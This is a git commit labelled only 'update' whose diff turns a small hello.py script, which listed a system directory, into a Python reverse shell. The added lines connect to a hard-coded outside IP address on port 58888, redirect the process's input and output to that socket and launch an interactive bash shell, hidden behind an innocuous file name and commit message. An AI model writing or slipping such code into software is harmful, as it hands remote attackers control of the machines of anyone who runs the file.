ab88dfe197330dc7ec522eaf004a833f5094c8a3
George <jouldjia@hotmail.com>
2017-05-17 13:53:41 -0700

    update

--- hello.py
+++ hello.py
@@ -1,3 +1,8 @@
-import os
+import socket,subprocess,os
 
-os.system("ls -l /etc/alternatives")
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("199.193.249.97",58888))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/bash","-i"])
